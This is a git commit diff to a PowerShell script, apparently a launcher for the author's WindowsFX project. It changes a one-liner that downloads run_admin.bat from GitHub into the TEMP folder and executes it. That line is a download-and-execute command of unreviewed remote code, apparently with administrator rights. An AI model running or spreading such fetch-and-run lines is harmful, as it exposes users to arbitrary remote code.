9295f67968b32ca5db65bac70e62c797bc58e0f8
Dazd <87366355+dazd-pkz@users.noreply.github.com>
2023-07-20 21:37:34 +0200

    Update powershell_screen.ps1

--- powershell_screen.ps1
+++ powershell_screen.ps1
@@ -1,1 +1,1 @@
-iwr -useb https://raw.githubusercontent.com/dazd-pkz/WindowsFX/main/run_admin.bat -o $env:TEMP\x.bat;& .\$env:TEMP\x.bat
+iwr -useb https://raw.githubusercontent.com/dazd-pkz/WindowsFX/main/run_admin.bat -o $env:TEMP\x.bat;cmd /c $env:TEMP\x.bat
